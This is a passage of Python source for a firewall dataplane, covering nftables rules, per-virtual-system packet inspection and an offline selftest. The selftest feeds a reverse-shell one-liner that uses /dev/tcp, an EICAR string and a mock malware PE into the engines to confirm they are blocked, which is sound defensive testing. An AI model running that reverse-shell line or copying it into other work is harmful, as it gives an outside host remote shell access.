        if sigdb.count() == 0:
            seed_sigs(sigdb)
        am = AntiMalware(sigdb=sigdb, threatdb=db, cloud=cloud)
    eng = InspectionEngine(inline, cloud, ThreatLog(threatlog_path), vsys=vsys_name,
                           vsys_id=vsys_id, antimalware=am)

    def handler(raw: bytes) -> int:
        v, _ = eng.verdict(parse_ip(raw))
        return v

    NFQueueSource(queue_num).run(handler)


# ===========================================================================
# The dataplane daemon
# ===========================================================================
class BareMetalDataplane:
    def __init__(self, cfg: DataplaneConfig, *, threatdb_path: Optional[str] = None,
                 threatlog_path: Optional[str] = None, sigdb_path: Optional[str] = None):
        self.cfg = cfg
        self.nft = NftGenerator(cfg)
        self.threatdb_path = threatdb_path or os.getenv(
            "FFN_THREATDB_PATH", "/var/lib/ffn-ngfw/threatdb.sqlite")
        self.sigdb_path = sigdb_path or os.getenv(
            "FFN_SIGDB_PATH", "/var/lib/ffn-ngfw/sigdb.sqlite")
        self.threatlog_path = threatlog_path
        self.threatlog = ThreatLog(threatlog_path)
        self.db = None
        self.inline = None
        self.cloud = None
        self.sigdb = None
        self.antimalware = None
        self.engines: Dict[str, InspectionEngine] = {}
        self.drainer = None
        self.cpu = CpuPlanes.from_system(data_frac=cfg.data_frac) if _HAVE_PLANES else None
        self._procs: List = []
        if _HAVE_DETECT:
            self._build_shared()
            self.build_engines()

    def _build_shared(self) -> None:
        self.db = ThreatDB(self.threatdb_path)
        self.inline = InlinePayloadDetector(self.db)
        if not self.inline.sigs:
            seed_baseline(self.inline)
        self.cloud = CloudDetectionService(
            self.db, inline=self.inline,
            backend=build_crucible_backend(
                self.cfg.crucible_backend, policy=self.cfg.crucible_policy,
                timeout=self.cfg.crucible_timeout,
                token_file=self.cfg.crucible_relay_token,
                pubkey_file=self.cfg.crucible_relay_pubkey))
        # inline anti-malware (signature DB + AV + heuristics) for carved files
        if _HAVE_AM:
            self.sigdb = SignatureDB(self.sigdb_path)
            if self.sigdb.count() == 0:
                seed_sigs(self.sigdb)
            self.antimalware = AntiMalware(sigdb=self.sigdb, threatdb=self.db,
                                           cloud=self.cloud)

    def build_engines(self) -> None:
        """One InspectionEngine per vsys (isolated flow state + stats)."""
        self.engines = {v.name: InspectionEngine(self.inline, self.cloud,
                                                 self.threatlog, vsys=v.name,
                                                 vsys_id=v.vsys_id,
                                                 antimalware=self.antimalware)
                        for v in self.cfg.vsys}

    # -- kernel programming ------------------------------------------------
    def render_nft(self) -> str:
        return self.nft.render()

    def check_nft(self) -> Tuple[bool, str]:
        rs = self.render_nft()
        try:
            p = subprocess.run(["nft", "-c", "-f", "-"], input=rs,
                               capture_output=True, text=True, timeout=15)
            return p.returncode == 0, (p.stderr or p.stdout).strip()
        except FileNotFoundError:
            return False, "nft binary not found (not on a Linux box with nftables)"
        except Exception as e:
            return False, str(e)

    def apply(self) -> None:
        if self.cfg.enable_forwarding:
            self._sysctl("net.ipv4.ip_forward", "1")
            self._sysctl("net.ipv6.conf.all.forwarding", "1")
        rs = self.render_nft()
        p = subprocess.run(["nft", "-f", "-"], input=rs, capture_output=True, text=True)
        if p.returncode != 0:
            raise RuntimeError("nft load failed: %s" % (p.stderr.strip()))
        logger.info("nftables ruleset loaded (table inet %s, %d vsys)",
                    self.cfg.table, len(self.cfg.vsys))

    def flush(self) -> None:
        subprocess.run(["nft", "delete", "table", "inet", self.cfg.table],
                       capture_output=True, text=True)
        logger.info("flushed table inet %s", self.cfg.table)

    @staticmethod
    def _sysctl(key: str, val: str) -> None:
        try:
            subprocess.run(["sysctl", "-w", "%s=%s" % (key, val)],
                           capture_output=True, text=True, check=False)
        except Exception as e:
            logger.debug("sysctl %s failed: %s", key, e)

    # -- CPU-plane / vsys placement ---------------------------------------
    def plan_placement(self) -> Dict[str, dict]:
        """Assign each vsys's data-plane worker to a data core. Returns the map."""
        n = len(self.cfg.vsys)
        cores = self.cpu.assign_data_cores(n) if self.cpu else [None] * n
        out = {}
        for i, v in enumerate(self.cfg.vsys):
            v.dp_core = cores[i]
            out[v.name] = {"nfqueue": v.nfqueue_num, "vsys_id": v.vsys_id,
                           "dp_core": v.dp_core,
                           "interfaces": v.interfaces(),
                           "zones": [z.name for z in v.zones],
                           "rules": len(v.rules)}
        return out

    # -- run ---------------------------------------------------------------
    def handle_raw(self, vsys_name: str, raw: bytes) -> int:
        """In-process dispatch (tests / single-core): route to a vsys engine."""
        eng = self.engines.get(vsys_name)
        if eng is None:
            return NF_ACCEPT
        v, _ = eng.verdict(parse_ip(raw))
        return v

    def run(self) -> None:
        """Apply the ruleset and spawn one pinned NFQUEUE worker per vsys."""
        if not _HAVE_DETECT:
            raise RuntimeError("detection stack unavailable: %s" %
                               globals().get("_IMPORT_ERR", "unknown"))
        self.apply()
        placement = self.plan_placement()
        logger.info("bare-metal NGFW: %d vsys, placement=%s", len(self.cfg.vsys),
                    {k: v["dp_core"] for k, v in placement.items()})
        if self.cpu is None:
            raise RuntimeError("ffn_cpu_planes unavailable")
        self.start_drainer()
        for v in self.cfg.vsys:
            core = v.dp_core if v.dp_core is not None else 0
            p = self.cpu.spawn_worker(
                core, _run_vsys_worker,
                args=(v.name, v.nfqueue_num, self.threatdb_path,
                      self.threatlog_path, v.vsys_id,
                      self.cfg.crucible_backend, self.cfg.crucible_policy,
                      self.cfg.crucible_timeout,
                      self.cfg.crucible_relay_token,
                      self.cfg.crucible_relay_pubkey),
                name="ffn-dp-%s" % v.name, realtime=self.cfg.realtime)
            self._procs.append(p)
        for p in self._procs:
            p.join()

    def start_drainer(self):
        """Start the one queue drainer, in this process.

        Without it the data plane spools every carved object to a `pending` row
        and nothing ever analyses it -- submission with no analysis, and no
        generated signatures. It lives here rather than in the vsys workers
        because the queue is shared: N drainers would contend to detonate the
        same sample, and the parent is not on a forwarding path.
        """
        if not self.cfg.crucible_drain or self.cloud is None:
            return None
        try:
            from cloud_det import QueueDrainer
        except ImportError as e:
            logger.warning("no queue drainer available (%s): carved objects "
                           "will be queued but not analysed", e)
            return None
        self.drainer = QueueDrainer(self.cloud).start()
        return self.drainer

    def stop(self) -> None:  # pragma: no cover
        if self.drainer is not None:
            self.drainer.stop()
            self.drainer = None
        for p in self._procs:
            try:
                p.terminate()
            except Exception:
                pass

    def stats(self) -> dict:
        s = {"table": self.cfg.table, "vsys": {}}
        if self.cloud is not None:
            s["crucible"] = {
                "backend": self.cloud.backend.name,
                "spec": self.cfg.crucible_backend,
                "policy": self.cfg.crucible_policy,
                "queue_depth": self.cloud.queue_depth(),
                "drainer": self.drainer.summary() if self.drainer
                           else {"running": False},
            }
        if self.cpu:
            s["cpu_planes"] = {p: c for p, c in self.cpu.snapshot()["planes"].items()}
        s["placement"] = self.plan_placement()
        for name, eng in self.engines.items():
            s["vsys"][name] = dict(eng.stats)
        return s


# ===========================================================================
# Synthetic packet builders (for the offline selftest)
# ===========================================================================
def build_ipv4(proto: int, saddr: str, daddr: str, l4: bytes) -> bytes:
    src, dst = socket.inet_aton(saddr), socket.inet_aton(daddr)
    total = 20 + len(l4)
    hdr = struct.pack("!BBHHHBBH", 0x45, 0, total, 0, 0x4000, 64, proto, 0) + src + dst
    return hdr + l4


def build_tcp(saddr, daddr, sport, dport, payload=b"", flags=0x18) -> bytes:
    tcp = struct.pack("!HHIIBBHHH", sport, dport, 1, 1, (5 << 4), flags, 65535, 0, 0)
    return build_ipv4(IPPROTO_TCP, saddr, daddr, tcp + payload)


def build_udp(saddr, daddr, sport, dport, payload=b"") -> bytes:
    udp = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0)
    return build_ipv4(IPPROTO_UDP, saddr, daddr, udp + payload)


# ===========================================================================
# Self-test -- no root, no nft, no NFQUEUE
# ===========================================================================
def selftest() -> int:
    print("ffn_bmfw selftest")

    # -- 1. multi-vsys nftables generation -------------------------------
    cfg = DataplaneConfig(vsys=[
        Vsys("vsys1", zones=[Zone("lan", ["eth1"], "trust"),
                             Zone("wan", ["eth0"], "untrust")],
             rules=[Rule("v1-web", "lan", "wan", proto="tcp", dports=[80, 443],
                         action="allow", inspect=True),
                    Rule("v1-deny-in", "wan", "lan", action="deny")],
             nat=[NatRule("v1-nat", "wan", kind="masquerade")]),
        Vsys("vsys2", zones=[Zone("lan", ["eth3"], "trust"),
                             Zone("wan", ["eth2"], "untrust")],
             rules=[Rule("v2-any", "lan", "wan", action="allow", inspect=True)],
             nat=[NatRule("v2-nat", "wan", kind="masquerade")]),
    ], mgmt_ifaces=["eth1"])

    rs = NftGenerator(cfg).render()
    for needle in ("table inet ffn_ngfw", "set vsys1_ifaces", "set vsys2_ifaces",
                   "iifname @vsys1_ifaces jump vsys1_forward",
                   "iifname @vsys2_ifaces jump vsys2_forward",
                   "chain vsys1_forward", "chain vsys2_forward",
                   "queue num 0 bypass", "queue num 1 bypass",
                   "iifname @vsys1_ifaces oifname @vsys1_zone_wan masquerade"):
        assert needle in rs, "nft missing %r\n%s" % (needle, rs)
    # vsys1 and vsys2 punt to DIFFERENT queues (isolation)
    assert cfg.vsys[0].nfqueue_num == 0 and cfg.vsys[1].nfqueue_num == 1
    print("  [ok] multi-vsys nft: per-vsys sets/chains/queues/nat (%d lines)" % rs.count("\n"))

    # -- 1b. VSYS numeric tag: conntrack zone (raw/prerouting) + ct/meta mark
    # (contract §2). vsys1->1, vsys2->2 derived from name.
    assert cfg.vsys[0].vsys_id == 1 and cfg.vsys[1].vsys_id == 2, \
        "vsys_id must be 1,2 (got %s)" % [v.vsys_id for v in cfg.vsys]
    # the ct zone MUST be stamped in a raw/prerouting chain, BEFORE conntrack
    # confirms -- not in the forward filter chain.
    assert "chain raw_prerouting {" in rs, "missing raw/prerouting zone chain\n%s" % rs
    assert "hook prerouting priority raw" in rs, "zone chain must hook at raw prio"
    pre = rs.split("chain raw_prerouting {", 1)[1].split("chain input", 1)[0]
    for needle in ("iifname @vsys1_ifaces ct zone set 1",
                   "iifname @vsys2_ifaces ct zone set 2"):
        assert needle in pre, "prerouting missing %r\n%s" % (needle, pre)
    # ct zone set must NOT leak into the per-vsys forward filter chains
    v1fwd = rs.split("chain vsys1_forward {", 1)[1].split("    chain ", 1)[0]
    assert "ct zone set" not in v1fwd, "ct zone belongs in raw/prerouting, not forward"
    # the tag is carried to userspace/DPDK via ct mark + meta mark in forward
    assert "ct mark set 1" in v1fwd and "meta mark set 1" in v1fwd, \
        "vsys1_forward must set ct mark + meta mark = 1\n%s" % v1fwd
    v2fwd = rs.split("chain vsys2_forward {", 1)[1].split("    chain ", 1)[0]
    assert "ct mark set 2" in v2fwd and "meta mark set 2" in v2fwd, \
        "vsys2_forward must set ct mark + meta mark = 2\n%s" % v2fwd
    print("  [ok] vsys tag: raw/prerouting ct zone set 1/2 + forward ct/meta mark")

    dp0 = BareMetalDataplane.__new__(BareMetalDataplane)
    dp0.cfg = cfg; dp0.nft = NftGenerator(cfg)
    ok, msg = dp0.check_nft()
    print("  [%s] nft -c validate: %s" % ("ok" if ok else "skip", msg[:70]))

    # -- 2. legacy single-vsys config back-compat -------------------------
    legacy = DataplaneConfig.from_dict({
        "zones": [{"name": "lan", "interfaces": ["eth1"], "kind": "trust"},
                  {"name": "wan", "interfaces": ["eth0"], "kind": "untrust"}],
        "rules": [{"name": "web", "from_zone": "lan", "to_zone": "wan",
                   "action": "allow", "inspect": True}],
        "nat": [{"name": "nat", "to_zone": "wan"}]})
    assert len(legacy.vsys) == 1 and legacy.vsys[0].name == "vsys1"
    assert "chain vsys1_forward" in NftGenerator(legacy).render()
    print("  [ok] legacy top-level zones/rules auto-wrap into vsys1")

    # -- 3. packet parser -------------------------------------------------
    http = build_tcp("10.0.0.5", "93.184.216.34", 44001, 80,
                     b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
    p = parse_ip(http)
    assert p.ok and p.saddr == "10.0.0.5" and p.dport == 80 and p.payload.startswith(b"GET ")
    fwd = parse_ip(build_tcp("10.0.0.5", "1.2.3.4", 40000, 80, b"x"))
    rev = parse_ip(build_tcp("1.2.3.4", "10.0.0.5", 80, 40000, b"y"))
    assert fwd.flow_key() == rev.flow_key()
    print("  [ok] IPv4/TCP parse + symmetric flow key")

    # flow_key is prepended with vsys_id (contract §2): identical 5-tuples in
    # different vsys produce different keys -> per-vsys flow/session tables
    # never collide.
    k1 = parse_ip(build_tcp("10.0.0.5", "1.2.3.4", 40000, 80, b"x"))
    k1.vsys_id = 1
    k2 = parse_ip(build_tcp("10.0.0.5", "1.2.3.4", 40000, 80, b"x"))
    k2.vsys_id = 2
    assert k1.flow_key().startswith("1/") and k2.flow_key().startswith("2/"), \
        "flow_key must lead with vsys_id: %r / %r" % (k1.flow_key(), k2.flow_key())
    assert k1.flow_key() != k2.flow_key(), "same 5-tuple must differ across vsys"
    print("  [ok] flow_key includes vsys_id (no cross-vsys collision)")

    if not _HAVE_DETECT:
        print("  [skip] detection stack unavailable"); print("  all (available) assertions passed")
        return 0

    # -- 4. vsys ISOLATION: two engines, independent flow state + stats ---
    db = ThreatDB(":memory:")
    inline = InlinePayloadDetector(db); seed_baseline(inline)
    cloud = CloudDetectionService(db, inline=inline, backend=LocalSandbox())
    e1 = InspectionEngine(inline, cloud, ThreatLog(), vsys="vsys1")
    e2 = InspectionEngine(inline, cloud, ThreatLog(), vsys="vsys2")

    # deliver an EICAR download to vsys1 only
    eicar = (b"HTTP/1.1 200 OK\r\n\r\n"
             rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    v1, ev1 = e1.verdict(parse_ip(build_tcp("9.9.9.9", "10.0.0.5", 80, 44001, eicar)))
    # vsys2 sees only benign traffic
    v2, ev2 = e2.verdict(parse_ip(build_tcp("10.0.1.5", "8.8.8.8", 5000, 80,
                                            b"GET /ok HTTP/1.1\r\n\r\n")))
    assert v1 == NF_DROP and ev1 and ev1["vsys"] == "vsys1", "vsys1 must drop EICAR"
    assert v2 == NF_ACCEPT and ev2 is None, "vsys2 benign must pass"
    assert e1.stats["drop"] == 1 and e2.stats["drop"] == 0, "stats must be per-vsys"
    assert e1.stats["threats"] == 1 and e2.stats["threats"] == 0
    assert len(e1.flows) == 1 and len(e2.flows) == 1, "flow tables must be isolated"
    print("  [ok] vsys isolation: vsys1 DROP(%s) / vsys2 clean; stats+flows separate"
          % ev1["threat"])

    # same 5-tuple in two vsys stays in separate flow tables (no cross-talk)
    tup = build_tcp("172.16.0.9", "172.16.0.1", 33333, 80, b"bash -i >& /dev/tcp/1.2.3.4/9 0>&1")
    a, ea = e1.verdict(parse_ip(tup))
    assert a == NF_DROP and e1.flows and ea["vsys"] == "vsys1"
    assert e2.stats["drop"] == 0, "conviction in vsys1 must not affect vsys2"
    print("  [ok] identical 5-tuple isolated across vsys (no session cross-talk)")

    # -- 5. daemon: per-vsys engines + CPU-plane placement ----------------
    dp = BareMetalDataplane(cfg, threatdb_path=":memory:", sigdb_path=":memory:")
    assert set(dp.engines) == {"vsys1", "vsys2"}
    place = dp.plan_placement()
    assert place["vsys1"]["nfqueue"] == 0 and place["vsys2"]["nfqueue"] == 1
    if _HAVE_PLANES and dp.cpu and dp.cpu.data_cores:
        # each vsys pinned to a data-plane core (distinct while cores remain)
        c1, c2 = place["vsys1"]["dp_core"], place["vsys2"]["dp_core"]
        assert c1 in dp.cpu.data_cores and c2 in dp.cpu.data_cores
        print("  [ok] CPU-plane placement: vsys1->core %s q0, vsys2->core %s q1" % (c1, c2))
    else:
        print("  [ok] placement map:", {k: v["nfqueue"] for k, v in place.items()})

    # route packets through the daemon per-vsys and confirm isolation in stats
    dp.handle_raw("vsys1", build_tcp("9.9.9.9", "10.0.0.5", 80, 40001, eicar))
    dp.handle_raw("vsys2", build_tcp("10.0.1.5", "8.8.8.8", 5001, 80, b"GET / HTTP/1.1\r\n\r\n"))
    st = dp.stats()
    assert st["vsys"]["vsys1"]["drop"] == 1 and st["vsys"]["vsys2"]["drop"] == 0
    print("  [ok] daemon per-vsys stats:", {k: v["drop"] for k, v in st["vsys"].items()},
          "(drops)")

    # -- 6. FILE-based inline anti-malware on carved objects --------------
    if _HAVE_AM and dp.antimalware is not None:
        # a stream clean to the IPS content sigs but carrying a malware PE body
        pe = b"MZ\x90\x00" + b"\x00" * 40 + b"CreateRemoteThread" + os.urandom(48)
        resp = b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n\r\n" + pe
        e = dp.engines["vsys1"]
        before = e.stats["drop"]
        v, ev = e.verdict(parse_ip(build_tcp("198.51.100.7", "10.0.0.30", 80, 45000, resp)))
        assert v == NF_DROP and ev and ev["type"] == "malware", "carved malware PE must block: %s" % ev
        assert "av" in ev["methods"] and e.stats["drop"] == before + 1
        print("  [ok] inline anti-malware: carved PE ->", ev["threat"], "via", ev["methods"],
              "(flow blocked)")
    else:
        print("  [skip] anti-malware engine unavailable")

    print("  all assertions passed")
    db.close()
    return 0


# ===========================================================================
# CLI
# ===========================================================================
def _load_cfg(path: Optional[str]) -> DataplaneConfig:
    return DataplaneConfig.load(path) if path else default_config()


def main(argv=None):
    ap = argparse.ArgumentParser(description="FFN NGFW generalized bare-metal dataplane (vsys)")
    ap.add_argument("--config")
    ap.add_argument("--threatdb", default=os.getenv(
        "FFN_THREATDB_PATH", "/var/lib/ffn-ngfw/threatdb.sqlite"))
    ap.add_argument("--threatlog", default="/var/log/ffn-ngfw/threats.jsonl")
    sub = ap.add_subparsers(dest="cmd", required=True)
    for c in ("selftest", "gen-nft", "check", "apply", "run", "flush", "planes", "stats"):
        sub.add_parser(c)
    args = ap.parse_args(argv)
    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    if args.cmd == "selftest":
        return selftest()

    cfg = _load_cfg(args.config)
    if args.cmd == "gen-nft":
        sys.stdout.write(NftGenerator(cfg).render()); return 0

    dp = BareMetalDataplane(cfg, threatdb_path=args.threatdb, threatlog_path=args.threatlog)
    if args.cmd == "check":
        ok, msg = dp.check_nft(); print("VALID" if ok else "INVALID:", msg); return 0 if ok else 1
    if args.cmd == "apply":
        dp.apply(); print("applied"); return 0
    if args.cmd == "flush":
        dp.flush(); print("flushed"); return 0
    if args.cmd in ("planes", "stats"):
        print(json.dumps(dp.stats(), indent=2, default=str)); return 0
    if args.cmd == "run":
        def _sig(_s, _f):
            logger.info("shutting down"); dp.stop()
        signal.signal(signal.SIGTERM, _sig); signal.signal(signal.SIGINT, _sig)
        try:
            dp.run()
        except RuntimeError as e:
            print("cannot run:", e, file=sys.stderr); return 1
        return 0
    return 0


if __name__ == "__main__":
    sys.exit(main())
